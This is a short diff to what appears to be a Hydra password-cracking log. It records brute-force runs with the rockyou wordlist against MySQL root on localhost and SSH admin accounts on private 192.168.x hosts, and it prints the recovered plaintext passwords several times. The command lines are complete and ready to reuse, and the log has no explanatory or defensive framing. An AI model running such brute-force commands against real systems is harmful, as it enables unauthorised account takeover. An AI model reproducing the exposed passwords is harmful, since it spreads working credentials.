@@ -12,3 +12,13 @@
 # Hydra v9.4 run at 2023-04-26 10:45:41 on localhost mysql (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I mysql://localhost)
 [3306][mysql] host: localhost   login: root   password: Cmonster2006!@#!@#!@#
 [3306][mysql] host: localhost   login: root   password: Cmonster2006!@#!@#!@#
+# Hydra v9.4 run at 2023-04-26 12:29:57 on 192.168.1.38 ssh (hydra -l admin -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.38)
+[22][ssh] host: 192.168.1.38   login: admin   password: Cmonster2006
+# Hydra v9.4 run at 2023-04-26 12:56:48 on localhost mysql (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I mysql://localhost)
+[3306][mysql] host: localhost   login: root   password: Cmonster2006!@#!@#!@#
+[3306][mysql] host: localhost   login: root   password: Cmonster2006!@#!@#!@#
+# Hydra v9.4 run at 2023-04-27 13:49:42 on 192.168.1.38 ssh (hydra -l admin -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.38)
+# Hydra v9.4 run at 2023-04-27 13:52:02 on 192.168.41.224 ssh (hydra -l admin -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.41.224)
+[22][ssh] host: 192.168.41.224   login: admin   password: Cmonster2006
+[22][ssh] host: 192.168.41.224   login: admin   password: Cmonster2006
+# Hydra v9.4 run at 2023-04-27 13:54:10 on Cmonster2006 ssh (hydra -l admin -P rockyou.txt -t 64 -vV -o output.log -I ssh://Cmonster2006)
